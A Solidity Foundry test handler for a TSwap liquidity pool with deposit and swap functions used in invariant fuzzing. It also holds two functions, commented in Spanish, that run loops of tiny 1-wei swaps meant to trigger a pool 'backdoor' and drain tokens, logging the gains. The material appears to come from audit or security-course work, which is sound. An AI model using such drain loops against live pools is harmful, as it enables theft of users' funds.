// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console2 } from "forge-std/Test.sol";
import { TSwapPool } from "../../src/TSwapPool.sol";
import { ERC20Mock } from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";

contract TswapPoolHandler is Test {
    TSwapPool pool;
    ERC20Mock weth;
    ERC20Mock poolToken;

    address liquidityProvider = makeAddr("liquidityProvider");
    address user = makeAddr("user");

    // Our Ghost variables
    int256 public actualDeltaY;
    int256 public expectedDeltaY;

    int256 public actualDeltaX;
    int256 public expectedDeltaX;

    int256 public startingX;
    int256 public startingY;

    constructor(TSwapPool _pool) {
        pool = _pool;
        weth = ERC20Mock(pool.getWeth());
        poolToken = ERC20Mock(pool.getPoolToken());
    }

    function swapPoolTokenForWethBasedOnOutputWeth(uint256 outputWethAmount) public {
        if (weth.balanceOf(address(pool)) <= pool.getMinimumWethDepositAmount()) {
            return;
        }
        outputWethAmount = bound(outputWethAmount, pool.getMinimumWethDepositAmount(), weth.balanceOf(address(pool)));
        // If these two values are the same, we will divide by 0
        if (outputWethAmount == weth.balanceOf(address(pool))) {
            return;
        }
        uint256 poolTokenAmount = pool.getInputAmountBasedOnOutput(
            outputWethAmount, // outputAmount
            poolToken.balanceOf(address(pool)), // inputReserves
            weth.balanceOf(address(pool)) // outputReserves
        );
        if (poolTokenAmount > type(uint64).max) {
            return;
        }
        // We * -1 since we are removing WETH from the system
        _updateStartingDeltas(int256(outputWethAmount) * -1, int256(poolTokenAmount));

        // Mint any necessary amount of pool tokens
        if (poolToken.balanceOf(user) < poolTokenAmount) {
            poolToken.mint(user, poolTokenAmount - poolToken.balanceOf(user) + 1);
        }

        vm.startPrank(user);
        // Approve tokens so they can be pulled by the pool during the swap
        poolToken.approve(address(pool), type(uint256).max);

        // Execute swap, giving pool tokens, receiving WETH
        pool.swapExactOutput({
            inputToken: poolToken,
            outputToken: weth,
            outputAmount: outputWethAmount,
            deadline: uint64(block.timestamp)
        });
        vm.stopPrank();
        _updateEndingDeltas();
    }

    function deposit(uint256 wethAmountToDeposit) public {
        // make the amount to deposit a "reasonable" number. We wouldn't expect someone to have type(uint256).max WETH!!
        wethAmountToDeposit = bound(wethAmountToDeposit, pool.getMinimumWethDepositAmount(), type(uint64).max);
        uint256 amountPoolTokensToDepositBasedOnWeth = pool.getPoolTokensToDepositBasedOnWeth(wethAmountToDeposit);
        _updateStartingDeltas(int256(wethAmountToDeposit), int256(amountPoolTokensToDepositBasedOnWeth));

        vm.startPrank(liquidityProvider);
        weth.mint(liquidityProvider, wethAmountToDeposit);
        poolToken.mint(liquidityProvider, amountPoolTokensToDepositBasedOnWeth);

        weth.approve(address(pool), wethAmountToDeposit);
        poolToken.approve(address(pool), amountPoolTokensToDepositBasedOnWeth);

        pool.deposit({
            wethToDeposit: wethAmountToDeposit,
            minimumLiquidityTokensToMint: 0,
            maximumPoolTokensToDeposit: amountPoolTokensToDepositBasedOnWeth,
            deadline: uint64(block.timestamp)
        });
        vm.stopPrank();
        _updateEndingDeltas();
    }

    // BACKDOOR EXPLOIT: Drenar el pool con swaps pequeños
    function exploitBackdoor() public {
        console2.log("=== BACKDOOR EXPLOIT ===");
        
        // Necesitamos algunos tokens para hacer swaps
        if (weth.balanceOf(user) < 1000) {
            weth.mint(user, 1000);
        }
        if (poolToken.balanceOf(user) < 1000) {
            poolToken.mint(user, 1000);
        }

        vm.startPrank(user);
        weth.approve(address(pool), type(uint256).max);
        poolToken.approve(address(pool), type(uint256).max);

        uint256 initialWethBalance = weth.balanceOf(user);
        uint256 initialPoolTokenBalance = poolToken.balanceOf(user);
        
        console2.log("Initial WETH balance:");
        console2.log(initialWethBalance);
        console2.log("Initial PoolToken balance:");
        console2.log(initialPoolTokenBalance);

        // Hacer 10 swaps pequeños para activar la backdoor
        for (uint i = 0; i < 10; i++) {
            console2.log("Swap");
            console2.log(i + 1);
            
            // Swap pequeño: 1 WETH -> PoolToken
            try pool.swapExactInput({
                inputToken: weth,
                inputAmount: 1,
                outputToken: poolToken,
                minOutputAmount: 0,
                deadline: uint64(block.timestamp)
            }) {
                console2.log("SUCCESS: Swap completed");
            } catch Error(string memory reason) {
                console2.log("FAIL: Swap failed");
                console2.log(reason);
                break;
            } catch {
                console2.log("FAIL: Swap failed with unknown error");
                break;
            }
        }

        uint256 finalWethBalance = weth.balanceOf(user);
        uint256 finalPoolTokenBalance = poolToken.balanceOf(user);
        
        console2.log("Final WETH balance:");
        console2.log(finalWethBalance);
        console2.log("Final PoolToken balance:");
        console2.log(finalPoolTokenBalance);
        console2.log("WETH gained:");
        console2.log(finalWethBalance - initialWethBalance);
        console2.log("PoolToken gained:");
        console2.log(finalPoolTokenBalance - initialPoolTokenBalance);
        
        vm.stopPrank();
    }

    // BACKDOOR EXPLOIT 2: Loop infinito para drenar completamente
    function exploitBackdoorInfinite() public {
        console2.log("=== INFINITE BACKDOOR EXPLOIT ===");
        
        // Necesitamos algunos tokens para hacer swaps
        if (weth.balanceOf(user) < 10000) {
            weth.mint(user, 10000);
        }
        if (poolToken.balanceOf(user) < 10000) {
            poolToken.mint(user, 10000);
        }

        vm.startPrank(user);
        weth.approve(address(pool), type(uint256).max);
        poolToken.approve(address(pool), type(uint256).max);

        uint256 initialWethBalance = weth.balanceOf(user);
        uint256 initialPoolTokenBalance = poolToken.balanceOf(user);
        
        console2.log("Initial WETH balance:");
        console2.log(initialWethBalance);
        console2.log("Initial PoolToken balance:");
        console2.log(initialPoolTokenBalance);

        // Hacer múltiples ciclos de 10 swaps
        for (uint cycle = 0; cycle < 5; cycle++) {
            console2.log("Starting cycle");
            console2.log(cycle + 1);
            
            for (uint i = 0; i < 10; i++) {
                // Swap pequeño: 1 WETH -> PoolToken
                try pool.swapExactInput({
                    inputToken: weth,
                    inputAmount: 1,
                    outputToken: poolToken,
                    minOutputAmount: 0,
                    deadline: uint64(block.timestamp)
                }) {
                    console2.log("SUCCESS: Swap completed");
                } catch Error(string memory reason) {
                    console2.log("FAIL: Swap failed");
                    console2.log(reason);
                    break;
                } catch {
                    console2.log("FAIL: Swap failed with unknown error");
                    break;
                }
            }
            
            uint256 currentWethBalance = weth.balanceOf(user);
            uint256 currentPoolTokenBalance = poolToken.balanceOf(user);
            console2.log("After cycle WETH balance:");
            console2.log(currentWethBalance);
            console2.log("After cycle PoolToken balance:");
            console2.log(currentPoolTokenBalance);
        }

        uint256 finalWethBalance = weth.balanceOf(user);
        uint256 finalPoolTokenBalance = poolToken.balanceOf(user);
        
        console2.log("Final WETH balance:");
        console2.log(finalWethBalance);
        console2.log("Final PoolToken balance:");
        console2.log(finalPoolTokenBalance);
        console2.log("Total WETH gained:");
        console2.log(finalWethBalance - initialWethBalance);
        console2.log("Total PoolToken gained:");
        console2.log(finalPoolTokenBalance - initialPoolTokenBalance);
        
        vm.stopPrank();
    }

    /*//////////////////////////////////////////////////////////////
                    HELPER FUNCTIONS
    //////////////////////////////////////////////////////////////*/
    function _updateStartingDeltas(int256 wethAmount, int256 poolTokenAmount) internal {
        startingY = int256(poolToken.balanceOf(address(pool)));
        startingX = int256(weth.balanceOf(address(pool)));

        expectedDeltaX = wethAmount;
        expectedDeltaY = poolTokenAmount;
    }

    function _updateEndingDeltas() internal {
        uint256 endingPoolTokenBalance = poolToken.balanceOf(address(pool));
        uint256 endingWethBalance = weth.balanceOf(address(pool));

        // sell tokens == x == poolTokens
        int256 actualDeltaPoolToken = int256(endingPoolTokenBalance) - int256(startingY);
        int256 deltaWeth = int256(endingWethBalance) - int256(startingX);

        actualDeltaX = deltaWeth;
        actualDeltaY = actualDeltaPoolToken;
    }
}